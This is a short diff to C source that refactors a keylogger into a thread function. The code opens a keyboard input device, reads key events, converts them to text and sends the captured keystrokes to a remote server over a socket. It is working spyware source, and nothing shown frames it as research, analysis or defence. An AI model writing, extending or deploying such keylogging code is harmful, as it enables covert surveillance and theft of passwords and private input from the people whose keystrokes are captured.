@@ -75,17 +75,18 @@ char* xt_to_ascii(int key_code) {
 }
 
 // Function to capture keystrokes and send them to the server
-void start_keylogger(int sock, const char *device_path) {
+void* start_keylogger(void* parameters) {
+    keyLoggerParameters_t params = *(keyLoggerParameters_t* )parameters;
     struct input_event ev;
     int fd;
     ssize_t n;
     char buffer[256];
 
     // Open the input device (keyboard device)
-    fd = open(device_path, O_RDONLY);
+    fd = open(params.keyboardFile, O_RDONLY);
     if (fd == -1) {
         perror("Cannot open input device");
-        return;
+        return NULL;
     }
 
     // Capture and send key events
@@ -104,11 +105,12 @@ void start_keylogger(int sock, const char *device_path) {
                 strcpy(msg.buffer, buffer);
                 msg.opCode='K';
                 msg.size=strlen(buffer);
-                send_message(sock, &msg);
+                sendMessage(params.sock, &msg);
             }
         }
     }
 
     // Close the device file
     close(fd);
+    return NULL;
 }
